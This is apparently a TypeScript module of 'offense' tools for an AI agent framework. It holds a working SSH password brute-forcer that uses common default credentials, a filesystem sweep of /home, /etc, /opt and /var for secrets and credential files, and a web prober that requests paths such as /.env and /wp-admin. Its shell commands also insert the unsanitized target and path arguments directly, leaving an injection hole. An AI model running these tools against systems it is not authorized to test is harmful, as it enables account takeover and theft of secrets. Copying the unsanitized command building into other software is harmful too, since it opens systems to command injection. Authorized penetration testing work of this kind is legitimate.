import { tool } from "ai";
import { z } from "zod";
import { registerTool } from "../mode.js";
import { sh } from "../execContext.js";
import type { ToolResult } from "../types.js";

/**
 * Attempt SSH password authentication with common passwords against a target.
 */
export function createSshBruteforceTool() {
  return tool({
    description: "Attempt SSH password authentication against a target host using common/default passwords. Useful for credential testing in authorized penetration tests. Tests ~20 common password pairs per user.",
    inputSchema: z.object({
      target: z.string().describe("Target hostname or IP address"),
      port: z.number().optional().describe("SSH port (default: 22)"),
      user: z.string().optional().describe("Username to test (default: root, admin, test)"),
      users: z.array(z.string()).optional().describe("List of usernames to test"),
    }),
    execute: async ({ target, port, user, users }): Promise<ToolResult> => {
      const sshPort = port ?? 22;
      const commonPasswords = [
        "password", "admin", "root", "123456", "12345678",
        "qwerty", "letmein", "welcome", "Passw0rd!", "toor",
        "test", "passwd", "iloveyou", "abc123", "password123",
        "P@ssw0rd", "changeme", "secret", "default", "1234",
      ];

      // Build user list
      const userList = users ?? (user ? [user] : ["root", "admin", "test"]);

      const results: string[] = [];
      for (const u of userList) {
        for (const pw of commonPasswords) {
          const result = await sh(
            `sshpass -p '${pw.replace(/'/g, "'\\''")}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p ${sshPort} ${u}@${target} "echo AUTH_SUCCESS" 2>/dev/null`,
            10_000,
          );
          if (result?.includes("AUTH_SUCCESS")) {
            results.push(`  ✔ ${u}:${pw} — AUTHENTICATION SUCCESSFUL`);
          }
        }
      }

      if (results.length > 0) {
        return { success: true, data: `Valid credentials found:\n${results.join("\n")}` };
      }
      return { success: true, data: "No valid credentials found with the tested password list." };
    },
  });
}

/**
 * Search filesystem for potential secrets and credentials.
 */
export function createFindSecretsTool() {
  return tool({
    description: "Search the filesystem for files potentially containing secrets, credentials, API keys, or tokens. Recursively greps for common patterns in config files, env files, and backup files. Results are truncated for safety.",
    inputSchema: z.object({
      path: z.string().optional().describe("Base path to search (default: /home, /etc, /opt)"),
      pattern: z.string().optional().describe("Custom search pattern (default: common credential patterns)"),
      depth: z.number().optional().describe("Search depth (default: 3, max: 6)"),
    }),
    execute: async ({ path, pattern, depth }): Promise<ToolResult> => {
      const searchPaths = path ?? "/home /etc /opt /var";
      const searchDepth = depth ? Math.min(depth, 6) : 3;
      const patterns = pattern ?? "(password|secret|api[_-]?key|token|credentials?)";

      const cmd = `find ${searchPaths} -maxdepth ${searchDepth} -type f \\( -name "*.env" -o -name "*.cfg" -o -name "*.conf" -o -name "*password*" -o -name "*secret*" -o -name "*.htpasswd" \\) 2>/dev/null | head -50`;
      const files = await sh(cmd, 15_000);
      if (!files || files.startsWith("Error")) {
        return { success: true, data: "No matching files found or search restricted." };
      }

      // For each found file, grep for credential patterns
      const parts: string[] = [`Found ${files.split("\n").length} candidate files (showing up to 50):\n`];
      const fileList = files.split("\n").slice(0, 20);
      for (const f of fileList) {
        if (!f.trim()) continue;
        const matches = await sh(`grep -in "${patterns}" "${f}" 2>/dev/null | head -5`, 5_000);
        if (matches && !matches.startsWith("Error")) {
          parts.push(`  ${f}:`);
          for (const line of matches.split("\n")) {
            // Mask the actual secret value for safety
            const masked = line.replace(/(=|\s)([A-Za-z0-9_\-]{20,})/g, "$1****");
            parts.push(`    ${masked}`);
          }
        }
      }

      return {
        success: true,
        data: parts.length > 1 ? parts.join("\n") : "No credential patterns found in candidate files.",
      };
    },
  });
}

/**
 * Probe HTTP endpoints and examine response headers and body.
 */
export function createWebProbeTool() {
  return tool({
    description: "Probe HTTP/HTTPS endpoints on a target. Checks response status, security headers, server banner, and common paths. Useful for web application reconnaissance.",
    inputSchema: z.object({
      target: z.string().describe("Target hostname or IP (e.g., 'example.com' or '10.0.0.1')"),
      port: z.number().optional().describe("Port (default: 80)"),
      tls: z.boolean().optional().describe("Use HTTPS (default: false)"),
      paths: z.array(z.string()).optional().describe("Paths to probe (default: /, /admin, /api, /robots.txt, /.well-known)"),
    }),
    execute: async ({ target, port, tls, paths }): Promise<ToolResult> => {
      const proto = tls ? "https" : "http";
      const targetPort = port ?? (tls ? 443 : 80);
      const base = `${proto}://${target}:${targetPort}`;
      const probePaths = paths ?? ["/", "/admin", "/api", "/robots.txt", "/.well-known/security.txt", "/.env", "/wp-admin"];
      const parts: string[] = [];

      // Check base server headers
      const baseHeaders = await sh(`curl -sI --connect-timeout 5 ${base} 2>/dev/null | head -20`, 10_000);
      if (baseHeaders) {
        parts.push("=== Server Headers ===");
        parts.push(baseHeaders);

        // Highlight security-relevant headers
        const missing: string[] = [];
        if (!baseHeaders.toLowerCase().includes("strict-transport-security")) missing.push("Strict-Transport-Security");
        if (!baseHeaders.toLowerCase().includes("content-security-policy")) missing.push("Content-Security-Policy");
        if (!baseHeaders.toLowerCase().includes("x-frame-options")) missing.push("X-Frame-Options");
        if (!baseHeaders.toLowerCase().includes("x-content-type-options")) missing.push("X-Content-Type-Options");
        if (missing.length > 0) {
          parts.push(`\n  Missing security headers: ${missing.join(", ")}`);
        }
      }

      // Probe paths
      parts.push("\n=== Path Probing ===");
      for (const p of probePaths) {
        const resp = await sh(`curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 ${base}${p} 2>/dev/null`, 8_000);
        const status = resp?.trim() || "no response";
        const icon = status.startsWith("2") ? "✔" : status.startsWith("3") ? "→" : status.startsWith("4") ? "−" : "?";
        parts.push(`  ${icon} ${status} ${p}`);
      }

      return { success: true, data: parts.join("\n") };
    },
  });
}

registerTool("ssh_bruteforce", "offense");
registerTool("find_secrets", "offense");
registerTool("web_probe", "offense");
